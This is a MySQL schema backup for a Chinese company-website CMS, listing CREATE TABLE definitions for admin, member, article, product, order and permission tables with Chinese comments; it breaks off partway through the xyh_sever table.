# -----------------------------------------------------------
# Description:备份的数据表[结构] xyh_access,xyh_admin,xyh_article,xyh_attachment,xyh_attachmentindex,xyh_block,xyh_category,xyh_category_access,xyh_comment,xyh_config,xyh_culture,xyh_guestbook,xyh_honor,xyh_itemgroup,xyh_iteminfo,xyh_link,xyh_member,xyh_memberdetail,xyh_membergroup,xyh_menu,xyh_meta,xyh_model,xyh_newtb,xyh_node,xyh_office,xyh_orderaction,xyh_orderdetail,xyh_orderinfo,xyh_page_detail,xyh_picture,xyh_product,xyh_role,xyh_role_user,xyh_sever,xyh_soft,xyh_special
# Description:备份的数据表[数据] xyh_access,xyh_admin,xyh_article,xyh_attachment,xyh_attachmentindex,xyh_block,xyh_category,xyh_category_access,xyh_comment,xyh_config,xyh_culture,xyh_guestbook,xyh_honor,xyh_itemgroup,xyh_iteminfo,xyh_link,xyh_member,xyh_memberdetail,xyh_membergroup,xyh_menu,xyh_meta,xyh_model,xyh_newtb,xyh_node,xyh_office,xyh_orderaction,xyh_orderdetail,xyh_orderinfo,xyh_page_detail,xyh_picture,xyh_product,xyh_role,xyh_role_user,xyh_sever,xyh_soft,xyh_special
# Time: 2017-07-03 16:42:24
# -----------------------------------------------------------
# SQLFile Label：#1
# -----------------------------------------------------------


# 表的结构 xyh_access 
DROP TABLE IF EXISTS `xyh_access`;
CREATE TABLE `xyh_access` (
  `role_id` smallint(6) unsigned NOT NULL,
  `node_id` smallint(6) unsigned NOT NULL,
  `level` tinyint(1) NOT NULL,
  `module` varchar(50) DEFAULT NULL,
  KEY `groupId` (`role_id`),
  KEY `nodeId` (`node_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_admin 
DROP TABLE IF EXISTS `xyh_admin`;
CREATE TABLE `xyh_admin` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(20) NOT NULL DEFAULT '' COMMENT '登录名',
  `password` varchar(32) NOT NULL DEFAULT '' COMMENT '密码',
  `encrypt` varchar(6) NOT NULL DEFAULT '',
  `realname` varchar(20) NOT NULL DEFAULT '',
  `email` varchar(100) NOT NULL DEFAULT '',
  `usertype` tinyint(4) NOT NULL DEFAULT '0',
  `logintime` int(10) unsigned NOT NULL COMMENT '登录时间',
  `loginip` varchar(30) NOT NULL COMMENT '登录IP',
  `islock` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '锁定状态',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='网站后台管理员表' ;

# 表的结构 xyh_article 
DROP TABLE IF EXISTS `xyh_article`;
CREATE TABLE `xyh_article` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL DEFAULT '' COMMENT '标题',
  `shorttitle` varchar(100) NOT NULL DEFAULT '' COMMENT '副标题',
  `color` char(10) NOT NULL DEFAULT '' COMMENT '标题颜色',
  `copyfrom` varchar(30) NOT NULL DEFAULT '',
  `author` varchar(30) NOT NULL DEFAULT '',
  `keywords` varchar(50) DEFAULT '' COMMENT '关键字',
  `litpic` varchar(150) NOT NULL DEFAULT '' COMMENT '缩略图',
  `content` text COMMENT '内容',
  `description` varchar(255) NOT NULL DEFAULT '' COMMENT '摘要描述',
  `publishtime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '发布时间',
  `updatetime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间',
  `click` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '点击数',
  `cid` int(10) unsigned NOT NULL COMMENT '分类ID',
  `commentflag` tinyint(1) NOT NULL DEFAULT '1' COMMENT '允许评论',
  `flag` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '属性',
  `jumpurl` varchar(200) NOT NULL DEFAULT '',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '1回收站',
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `aid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'admin',
  PRIMARY KEY (`id`),
  KEY `cid` (`cid`)
) ENGINE=MyISAM AUTO_INCREMENT=70 DEFAULT CHARSET=utf8 COMMENT='所有文章' ;

# 表的结构 xyh_attachment 
DROP TABLE IF EXISTS `xyh_attachment`;
CREATE TABLE `xyh_attachment` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(60) NOT NULL DEFAULT '' COMMENT '原文件名',
  `filepath` varchar(200) NOT NULL DEFAULT '',
  `filetype` smallint(6) NOT NULL DEFAULT '1',
  `filesize` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `haslitpic` tinyint(1) NOT NULL DEFAULT '1',
  `uploadtime` int(10) unsigned NOT NULL DEFAULT '0',
  `aid` int(10) unsigned NOT NULL DEFAULT '0',
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=235 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_attachmentindex 
DROP TABLE IF EXISTS `xyh_attachmentindex`;
CREATE TABLE `xyh_attachmentindex` (
  `attid` int(10) unsigned NOT NULL DEFAULT '0',
  `arcid` int(10) unsigned NOT NULL DEFAULT '0',
  `modelid` int(10) unsigned NOT NULL DEFAULT '0',
  `desc` varchar(20) NOT NULL DEFAULT '',
  KEY `attid` (`attid`),
  KEY `arcid` (`arcid`),
  KEY `modelid` (`modelid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_block 
DROP TABLE IF EXISTS `xyh_block`;
CREATE TABLE `xyh_block` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL DEFAULT '' COMMENT '名称',
  `remark` varchar(200) NOT NULL DEFAULT '' COMMENT '说明',
  `content` text COMMENT '内容',
  `blocktype` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '类型',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_category 
DROP TABLE IF EXISTS `xyh_category`;
CREATE TABLE `xyh_category` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(30) NOT NULL DEFAULT '' COMMENT '栏目分类名称',
  `ename` varchar(200) NOT NULL DEFAULT '' COMMENT '别名',
  `catpic` varchar(150) NOT NULL DEFAULT '',
  `pid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '上级分类',
  `modelid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '所属模型',
  `type` tinyint(4) NOT NULL DEFAULT '0' COMMENT '类别',
  `seotitle` varchar(50) NOT NULL DEFAULT '',
  `keywords` varchar(50) DEFAULT '' COMMENT '关键字',
  `description` varchar(255) DEFAULT '' COMMENT '关键字',
  `template_category` varchar(60) NOT NULL DEFAULT '',
  `template_list` varchar(60) NOT NULL DEFAULT '',
  `template_show` varchar(60) NOT NULL DEFAULT '',
  `content` text COMMENT '内容',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '显示',
  `sort` smallint(6) NOT NULL DEFAULT '100' COMMENT '排序',
  `litpic` varchar(150) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `pid` (`pid`)
) ENGINE=MyISAM AUTO_INCREMENT=102 DEFAULT CHARSET=utf8 COMMENT='栏目分类表' ;

# 表的结构 xyh_category_access 
DROP TABLE IF EXISTS `xyh_category_access`;
CREATE TABLE `xyh_category_access` (
  `catid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `roleid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `flag` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `action` varchar(30) NOT NULL DEFAULT '',
  KEY `catid` (`catid`),
  KEY `roleid` (`roleid`),
  KEY `flag` (`flag`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_comment 
DROP TABLE IF EXISTS `xyh_comment`;
CREATE TABLE `xyh_comment` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `postid` int(10) unsigned NOT NULL DEFAULT '0',
  `modelid` int(10) unsigned NOT NULL DEFAULT '0',
  `title` varchar(100) NOT NULL DEFAULT '',
  `username` varchar(30) NOT NULL DEFAULT '',
  `email` varchar(100) NOT NULL DEFAULT '',
  `ip` varchar(20) NOT NULL DEFAULT '',
  `agent` varchar(255) NOT NULL DEFAULT '',
  `posttime` int(10) unsigned NOT NULL DEFAULT '0',
  `content` text NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `pid` int(10) unsigned NOT NULL DEFAULT '0',
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `postid` (`postid`),
  KEY `modelid` (`modelid`),
  KEY `pid` (`pid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_config 
DROP TABLE IF EXISTS `xyh_config`;
CREATE TABLE `xyh_config` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(30) NOT NULL DEFAULT '' COMMENT '标识',
  `title` varchar(50) NOT NULL DEFAULT '' COMMENT '名称',
  `remark` varchar(100) NOT NULL DEFAULT '' COMMENT '说明',
  `tvalue` varchar(150) NOT NULL DEFAULT '' COMMENT '参数类型',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0' COMMENT '类型',
  `groupid` smallint(5) unsigned NOT NULL DEFAULT '0' COMMENT '分组',
  `value` text,
  `sort` smallint(3) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`),
  KEY `typeid` (`typeid`),
  KEY `groupid` (`groupid`)
) ENGINE=MyISAM AUTO_INCREMENT=41 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_culture 
DROP TABLE IF EXISTS `xyh_culture`;
CREATE TABLE `xyh_culture` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) DEFAULT NULL COMMENT '标题',
  `content` text COMMENT '介绍',
  `pic` varchar(255) DEFAULT NULL COMMENT '文化图',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=32 DEFAULT CHARSET=utf8 COMMENT='企业文化表' ;

# 表的结构 xyh_guestbook 
DROP TABLE IF EXISTS `xyh_guestbook`;
CREATE TABLE `xyh_guestbook` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(30) NOT NULL DEFAULT '',
  `tel` varchar(50) NOT NULL DEFAULT '',
  `email` varchar(50) NOT NULL DEFAULT '',
  `homepage` varchar(50) NOT NULL DEFAULT '',
  `qq` varchar(15) NOT NULL DEFAULT '',
  `ip` varchar(20) NOT NULL DEFAULT '',
  `posttime` int(10) unsigned NOT NULL DEFAULT '0',
  `replytime` int(10) unsigned NOT NULL DEFAULT '0',
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `content` text,
  `reply` text,
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_honor 
DROP TABLE IF EXISTS `xyh_honor`;
CREATE TABLE `xyh_honor` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `honor` varchar(255) DEFAULT NULL COMMENT '证书名字',
  `pic` varchar(255) DEFAULT NULL COMMENT '证书地址',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=44 DEFAULT CHARSET=utf8 COMMENT='资质荣誉表' ;

# 表的结构 xyh_itemgroup 
DROP TABLE IF EXISTS `xyh_itemgroup`;
CREATE TABLE `xyh_itemgroup` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `remark` varchar(20) DEFAULT '',
  `status` tinyint(1) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_iteminfo 
DROP TABLE IF EXISTS `xyh_iteminfo`;
CREATE TABLE `xyh_iteminfo` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `group` varchar(20) NOT NULL,
  `value` int(11) NOT NULL DEFAULT '0',
  `pid` int(10) unsigned NOT NULL DEFAULT '0',
  `sort` smallint(6) NOT NULL DEFAULT '0' COMMENT '排序',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=56 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_link 
DROP TABLE IF EXISTS `xyh_link`;
CREATE TABLE `xyh_link` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL DEFAULT '',
  `url` varchar(255) NOT NULL DEFAULT '',
  `logo` varchar(255) NOT NULL DEFAULT '',
  `description` varchar(255) NOT NULL DEFAULT '' COMMENT '描述',
  `ischeck` tinyint(1) NOT NULL DEFAULT '1' COMMENT '首页|内页',
  `posttime` int(10) unsigned NOT NULL,
  `sort` smallint(5) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=29 DEFAULT CHARSET=utf8 COMMENT='友情链接' ;

# 表的结构 xyh_member 
DROP TABLE IF EXISTS `xyh_member`;
CREATE TABLE `xyh_member` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `email` varchar(50) NOT NULL,
  `password` char(32) NOT NULL,
  `encrypt` varchar(6) NOT NULL DEFAULT '',
  `nickname` varchar(20) DEFAULT '',
  `amount` decimal(8,2) unsigned NOT NULL DEFAULT '0.00' COMMENT '总金额',
  `score` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '积分',
  `face` varchar(60) NOT NULL DEFAULT '' COMMENT '头像',
  `regtime` int(10) unsigned NOT NULL DEFAULT '0',
  `logintime` int(10) unsigned DEFAULT '0',
  `loginip` varchar(20) DEFAULT '',
  `loginnum` mediumint(8) unsigned DEFAULT '0',
  `groupid` smallint(6) unsigned DEFAULT '0',
  `message` tinyint(1) DEFAULT '0',
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `islock` tinyint(1) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_memberdetail 
DROP TABLE IF EXISTS `xyh_memberdetail`;
CREATE TABLE `xyh_memberdetail` (
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `sex` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `realname` varchar(30) NOT NULL DEFAULT '',
  `birthday` date NOT NULL DEFAULT '1980-01-01',
  `province` int(10) unsigned NOT NULL DEFAULT '0',
  `area` int(10) unsigned NOT NULL DEFAULT '0',
  `address` varchar(50) NOT NULL DEFAULT '',
  `qq` varchar(12) NOT NULL DEFAULT '',
  `tel` varchar(15) NOT NULL DEFAULT '',
  `mobile` varchar(15) NOT NULL DEFAULT '',
  `animal` int(10) unsigned NOT NULL DEFAULT '0',
  `star` int(10) unsigned NOT NULL DEFAULT '0',
  `blood` int(10) unsigned NOT NULL DEFAULT '0',
  `marital` int(10) unsigned NOT NULL DEFAULT '0',
  `education` int(10) unsigned NOT NULL DEFAULT '0',
  `vocation` int(10) unsigned NOT NULL DEFAULT '0',
  `income` int(10) unsigned NOT NULL DEFAULT '0',
  `maxim` varchar(100) NOT NULL DEFAULT '',
  `updatetime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_membergroup 
DROP TABLE IF EXISTS `xyh_membergroup`;
CREATE TABLE `xyh_membergroup` (
  `id` smallint(6) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL DEFAULT '',
  `description` varchar(255) DEFAULT '',
  `rank` smallint(6) NOT NULL DEFAULT '0',
  `status` tinyint(1) DEFAULT '0',
  `sort` tinyint(3) unsigned DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_menu 
DROP TABLE IF EXISTS `xyh_menu`;
CREATE TABLE `xyh_menu` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(30) NOT NULL DEFAULT '',
  `pid` int(10) unsigned NOT NULL DEFAULT '0',
  `module` varchar(20) NOT NULL DEFAULT '',
  `action` varchar(20) DEFAULT '',
  `parameter` varchar(100) DEFAULT '',
  `quick` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '显示',
  `sort` smallint(6) NOT NULL DEFAULT '100',
  PRIMARY KEY (`id`),
  KEY `pid` (`pid`)
) ENGINE=MyISAM AUTO_INCREMENT=49 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_meta 
DROP TABLE IF EXISTS `xyh_meta`;
CREATE TABLE `xyh_meta` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `groupid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `name` varchar(30) NOT NULL DEFAULT '' COMMENT 'key',
  `value` text,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`),
  KEY `groupid` (`groupid`)
) ENGINE=MyISAM AUTO_INCREMENT=28 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_model 
DROP TABLE IF EXISTS `xyh_model`;
CREATE TABLE `xyh_model` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(30) NOT NULL DEFAULT '',
  `description` varchar(255) NOT NULL DEFAULT '',
  `tablename` varchar(30) NOT NULL DEFAULT '',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `template_category` varchar(60) NOT NULL DEFAULT '',
  `template_list` varchar(60) NOT NULL DEFAULT '',
  `template_show` varchar(60) NOT NULL DEFAULT '',
  `sort` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=36 DEFAULT CHARSET=utf8 COMMENT='模型相关' ;

# 表的结构 xyh_newtb 
DROP TABLE IF EXISTS `xyh_newtb`;
CREATE TABLE `xyh_newtb` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL DEFAULT '' COMMENT '标题',
  `shorttitle` varchar(100) NOT NULL DEFAULT '' COMMENT '副标题',
  `color` char(10) NOT NULL DEFAULT '' COMMENT '标题颜色',
  `copyfrom` varchar(30) NOT NULL DEFAULT '',
  `author` varchar(30) NOT NULL DEFAULT '',
  `keywords` varchar(50) DEFAULT '' COMMENT '关键字',
  `litpic` varchar(150) NOT NULL DEFAULT '' COMMENT '缩略图',
  `content` text COMMENT '内容',
  `description` varchar(255) NOT NULL DEFAULT '' COMMENT '摘要描述',
  `publishtime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '发布时间',
  `updatetime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间',
  `click` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '点击数',
  `cid` int(10) unsigned NOT NULL COMMENT '分类ID',
  `commentflag` tinyint(1) NOT NULL DEFAULT '1' COMMENT '允许评论',
  `flag` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '属性',
  `jumpurl` varchar(200) NOT NULL DEFAULT '',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '1回收站',
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `aid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'admin',
  PRIMARY KEY (`id`),
  KEY `cid` (`cid`)
) ENGINE=MyISAM AUTO_INCREMENT=31 DEFAULT CHARSET=utf8 COMMENT='自定义模型表' ;

# 表的结构 xyh_node 
DROP TABLE IF EXISTS `xyh_node`;
CREATE TABLE `xyh_node` (
  `id` smallint(6) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `title` varchar(50) DEFAULT NULL,
  `status` tinyint(1) DEFAULT '0',
  `remark` varchar(255) DEFAULT NULL,
  `sort` smallint(6) unsigned DEFAULT NULL,
  `pid` smallint(6) unsigned NOT NULL,
  `level` tinyint(1) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `level` (`level`),
  KEY `pid` (`pid`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=135 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_office 
DROP TABLE IF EXISTS `xyh_office`;
CREATE TABLE `xyh_office` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(150) NOT NULL DEFAULT '' COMMENT '办事处',
  `address` varchar(100) DEFAULT '' COMMENT '地址',
  `tel` varchar(100) DEFAULT '' COMMENT '电话',
  `fax` varchar(150) DEFAULT '' COMMENT '传真',
  `contacts` varchar(120) DEFAULT '' COMMENT '联系人',
  `email` varchar(120) DEFAULT '' COMMENT '邮箱',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=52 DEFAULT CHARSET=utf8 COMMENT='联系表' ;

# 表的结构 xyh_orderaction 
DROP TABLE IF EXISTS `xyh_orderaction`;
CREATE TABLE `xyh_orderaction` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '流水号',
  `orderid` varchar(30) NOT NULL,
  `order_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '订单状态',
  `distribution_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '配送状态',
  `pay_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '支付状态',
  `aid` int(10) NOT NULL DEFAULT '0',
  `note` varchar(255) NOT NULL DEFAULT '',
  `publishtime` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `orderid` (`orderid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_orderdetail 
DROP TABLE IF EXISTS `xyh_orderdetail`;
CREATE TABLE `xyh_orderdetail` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `orderid` varchar(30) DEFAULT NULL COMMENT '订单ID',
  `productid` int(11) DEFAULT NULL,
  `userid` int(10) NOT NULL DEFAULT '0',
  `title` varchar(100) NOT NULL DEFAULT '',
  `price` decimal(8,2) NOT NULL DEFAULT '0.00',
  `marketprice` decimal(8,2) NOT NULL DEFAULT '0.00',
  `num` int(10) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_orderinfo 
DROP TABLE IF EXISTS `xyh_orderinfo`;
CREATE TABLE `xyh_orderinfo` (
  `orderid` varchar(30) NOT NULL,
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `payid` tinyint(2) NOT NULL DEFAULT '1' COMMENT '支付方式',
  `expressprice` decimal(8,2) NOT NULL DEFAULT '0.00' COMMENT '邮费/运费',
  `prdouctprice` decimal(8,2) NOT NULL DEFAULT '0.00' COMMENT '产品总价格',
  `totalprice` decimal(8,2) NOT NULL DEFAULT '0.00' COMMENT '总价格',
  `consignee` varchar(30) DEFAULT NULL COMMENT '收件人',
  `address` varchar(255) NOT NULL DEFAULT '',
  `zip` int(10) NOT NULL DEFAULT '0',
  `tel` varchar(60) NOT NULL DEFAULT '',
  `email` varchar(100) NOT NULL DEFAULT '',
  `remark` varchar(255) NOT NULL DEFAULT '',
  `note` varchar(255) NOT NULL DEFAULT '',
  `order_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '订单状态',
  `distribution_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '配送状态',
  `pay_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '支付状态',
  `ip` char(15) NOT NULL DEFAULT '',
  `stime` int(10) NOT NULL DEFAULT '0',
  `confirm_time` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '确认时间',
  `pay_time` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '支付时间',
  `distribution_time` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '配送时间',
  PRIMARY KEY (`orderid`),
  KEY `stime` (`stime`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_page_detail 
DROP TABLE IF EXISTS `xyh_page_detail`;
CREATE TABLE `xyh_page_detail` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '编号',
  `pid` int(11) DEFAULT NULL COMMENT '对应具体的页面ID',
  `bigtitle` varchar(255) DEFAULT NULL COMMENT '大标题',
  `description` text COMMENT '第一段落',
  `subtitle` text COMMENT '子标题合集',
  `subcontent` text COMMENT '子段落合集',
  `subimg` text COMMENT '子段落图片合集',
  `example` text COMMENT '成功案例',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=25 DEFAULT CHARSET=utf8 COMMENT='自定义页面详情表' ;

# 表的结构 xyh_picture 
DROP TABLE IF EXISTS `xyh_picture`;
CREATE TABLE `xyh_picture` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL DEFAULT '' COMMENT '标题',
  `color` char(10) NOT NULL DEFAULT '' COMMENT '标题颜色',
  `keywords` varchar(50) DEFAULT '' COMMENT '关键字',
  `litpic` varchar(150) NOT NULL DEFAULT '' COMMENT '缩略图',
  `description` varchar(255) NOT NULL DEFAULT '' COMMENT '摘要描述',
  `copyfrom` varchar(100) NOT NULL DEFAULT '' COMMENT '来源',
  `template` varchar(30) NOT NULL DEFAULT '' COMMENT '模板',
  `pictureurls` text COMMENT '图片地址',
  `content` text COMMENT '内容',
  `publishtime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '发布时间',
  `updatetime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间',
  `click` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '点击数',
  `cid` int(10) unsigned NOT NULL COMMENT '分类ID',
  `commentflag` tinyint(1) NOT NULL DEFAULT '1' COMMENT '允许评论',
  `flag` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '属性',
  `jumpurl` varchar(200) NOT NULL DEFAULT '',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '1回收站',
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `aid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'admin',
  PRIMARY KEY (`id`),
  KEY `cid` (`cid`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_product 
DROP TABLE IF EXISTS `xyh_product`;
CREATE TABLE `xyh_product` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL DEFAULT '' COMMENT '标题',
  `color` char(10) NOT NULL DEFAULT '' COMMENT '标题颜色',
  `keywords` varchar(50) DEFAULT '' COMMENT '关键字',
  `litpic` varchar(150) NOT NULL DEFAULT '' COMMENT '缩略图',
  `pictureurls` text COMMENT '图片地址',
  `content` text COMMENT '内容',
  `description` varchar(1000) NOT NULL DEFAULT '' COMMENT '摘要描述',
  `price` decimal(8,2) NOT NULL DEFAULT '0.00',
  `marketprice` decimal(8,2) NOT NULL DEFAULT '0.00',
  `brand` varchar(50) NOT NULL DEFAULT '' COMMENT '品牌',
  `units` varchar(50) NOT NULL DEFAULT '' COMMENT '单位',
  `specification` varchar(50) NOT NULL DEFAULT '' COMMENT '规格',
  `publishtime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '发布时间',
  `updatetime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '更新时间',
  `click` smallint(6) unsigned NOT NULL DEFAULT '0' COMMENT '点击数',
  `cid` int(10) unsigned NOT NULL COMMENT '分类ID',
  `commentflag` tinyint(1) NOT NULL DEFAULT '1' COMMENT '允许评论',
  `flag` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT '属性',
  `jumpurl` varchar(200) NOT NULL DEFAULT '',
  `status` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '1回收站',
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `aid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'admin',
  `advantages` text COMMENT '技术优势',
  `apptitle` text COMMENT '典型应用的标题',
  `appcontent` text COMMENT '典型应用的内容',
  `apppicurls` text COMMENT '典型应用的图片地址',
  `advcontent` text COMMENT '内容',
  PRIMARY KEY (`id`),
  KEY `cid` (`cid`)
) ENGINE=MyISAM AUTO_INCREMENT=29 DEFAULT CHARSET=utf8 COMMENT='产品表' ;

# 表的结构 xyh_role 
DROP TABLE IF EXISTS `xyh_role`;
CREATE TABLE `xyh_role` (
  `id` smallint(6) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `pid` smallint(6) DEFAULT NULL,
  `status` tinyint(1) unsigned DEFAULT NULL,
  `remark` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `pid` (`pid`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_role_user 
DROP TABLE IF EXISTS `xyh_role_user`;
CREATE TABLE `xyh_role_user` (
  `role_id` mediumint(9) unsigned DEFAULT NULL,
  `user_id` char(32) DEFAULT NULL,
  KEY `group_id` (`role_id`),
  KEY `user_id` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ;

# 表的结构 xyh_sever 
DROP TABLE IF EXISTS `xyh_sever`;
CREATE TABLE `xyh_sever` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '内容id',
